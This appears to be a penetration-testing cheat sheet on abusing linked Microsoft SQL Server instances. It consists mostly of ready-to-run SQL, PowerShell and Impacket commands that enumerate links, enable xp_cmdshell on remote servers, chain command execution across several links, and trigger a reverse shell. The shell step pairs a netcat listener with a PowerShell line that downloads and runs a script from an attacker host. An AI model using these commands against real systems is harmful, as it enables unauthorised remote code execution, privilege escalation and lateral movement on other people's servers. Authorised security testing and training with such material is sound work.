---
tags:
  - Exploitation
  - Foundational
  - SQL
  - Windows
---

## Linked SQL Servers
resources: [NetSPI - SQL Server Link Crawling](https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql/)

> [!danger] SQL Server links allow queries to remote servers. Links may have different (higher) privileges than initial connection.

### Enumerate Linked Servers [Remote]
```sql
SELECT * FROM sys.servers WHERE is_linked = 1
```

```sql
EXEC sp_linkedservers
```

### PowerUpSQL Enumeration [Remote]
```powershell
Get-SQLServerLink -Instance <Target>
Get-SQLServerLinkCrawl -Instance <Target>
```

### Check Link Privileges [Remote]
```sql
-- Execute query on linked server
SELECT * FROM OPENQUERY("<LinkedServer>", 'SELECT SYSTEM_USER')
SELECT * FROM OPENQUERY("<LinkedServer>", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')
```

## Executing Commands via Links

### Enable xp_cmdshell on Linked Server [Remote]
```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [<LinkedServer>]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [<LinkedServer>]
```

### Execute Commands [Remote]
```sql
EXEC ('xp_cmdshell ''whoami''') AT [<LinkedServer>]
```

### Via OPENQUERY [alternative]
```sql
SELECT * FROM OPENQUERY("<LinkedServer>", 'SELECT * FROM OPENQUERY("<SecondLinkedServer>", ''SELECT SYSTEM_USER'')')
```

## Link Crawling

### Recursive Link Enumeration [Remote]
```sql
-- Find links from linked server
SELECT * FROM OPENQUERY("<LinkedServer>", 'SELECT * FROM sys.servers WHERE is_linked = 1')
```

### PowerUpSQL Crawl [Remote]
```powershell
Get-SQLServerLinkCrawl -Instance <Target> -Verbose
```

### Chain Multiple Links [Remote]
```sql
-- Server1 -> Server2 -> Server3
SELECT * FROM OPENQUERY("Server1", 'SELECT * FROM OPENQUERY("Server2", ''SELECT * FROM OPENQUERY("Server3", ''''SELECT SYSTEM_USER'''')'')' )
```

## Double-Hop Execution

### Execute on Distant Linked Server [Remote]
```sql
-- Enable xp_cmdshell through link chain
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE'') AT [Server2]') AT [Server1]

-- Execute command through chain
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [Server2]') AT [Server1]
```

## Reverse Connection via Link

### Setup Listener [Local]
```bash
nc -nvlp 4444
```

### Trigger Reverse Shell [Remote]
```sql
EXEC ('xp_cmdshell ''powershell -c "IEX(New-Object Net.WebClient).DownloadString(''''http://<AttackerIP>/shell.ps1'''')"''') AT [<LinkedServer>]
```

## Link Security Context

### Check Effective User [Remote]
```sql
SELECT * FROM OPENQUERY("<LinkedServer>", 'SELECT SYSTEM_USER, USER_NAME()')
```

### Common Link Misconfigurations
> [!warning] Common misconfigurations:
> - Link configured with **sa** account
> - Link uses service account with sysadmin
> - Link impersonates connecting user (chain their privileges)

## Impacket Link Commands [Local]
```bash
impacket-mssqlclient <User>:<Pass>@<Target> -windows-auth

SQL> enum_links
SQL> use_link <LinkedServer>
SQL> xp_cmdshell whoami
```
